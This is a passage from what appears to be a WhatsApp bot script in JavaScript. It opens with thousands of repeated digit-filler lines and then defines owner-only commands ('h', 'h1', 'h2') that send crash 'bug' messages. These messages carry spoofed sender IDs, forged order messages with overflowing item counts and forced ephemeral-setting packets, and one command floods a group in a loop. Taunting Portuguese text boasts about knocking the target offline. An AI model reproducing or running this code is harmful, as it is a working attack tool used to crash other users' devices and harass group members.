*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *9
`,
    orderTitle: 'BY ZADIK HENPLAY ', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
let ps = loli.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         },
         "type": "EPHEMERAL_SETTING",
         "ephemeralExpiration": 0
      }
   }, {}) 
            loli.relayWAMessage(ps, {waitForAck: true})
break
  case 'h1':
  if (!isOwner) return reply('somente meu criador')
              if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
loli.sendMessage(nomor, `
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
 ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
@zadik te derrubando vadia henplay domina`, MessageType.extendedText,{
 quoted:  {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: img2,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️ZADIK☠️',
    orderTitle: 'Hori-BOT', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
let po = loli.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
            
         },
         "type": "EPHEMERAL_SETTING",
         "ephemeralExpiration": 0
      }
   }, {}) 
            loli.relayWAMessage(po, {waitForAck: true})
}}
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}
attack(mek.key.remoteJid)
break
          case 'h2':
          if (!isOwner) return reply('somente meu criador')
if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
if (args.length < 1) return reply('DERRUBADO?')
		        try {
		        var hets = `ZADIK`
		        var grousp = await loli.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        loli.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `zadik`,
						"orderTitle": `HORI`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        loli.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `HORI`,
						"orderTitle": `ZADIK-HACKER`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		   break
 case 'h':
 if (!isOwner) return reply('somente meu criador')
if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
                 let asu = loli.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
         },
         "type": "EPHEMERAL_SETTING",
         "ephemeralExpiration": 0
      }
   }, {}) 
            loli.relayWAMessage(asu, {waitForAck: true})
loli.sendMessage(from, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `ZADIK`,
    orderTitle: `HORI`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    loli.updatePresence(from, Presence.composing)
	    sendMess(`zadik`)
	    }, 2000)
	    reply(`zadik te derrubou kkk`)
break
                    case 'deathnote':
                    addFilter(from)
                    if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}deathnote matar pessoa perfurado`)
					 reply(mess.wait)
                     query = args.join(" ")
					if (query.length > 200) return reply('O texto é longo, até 200 caracteres')
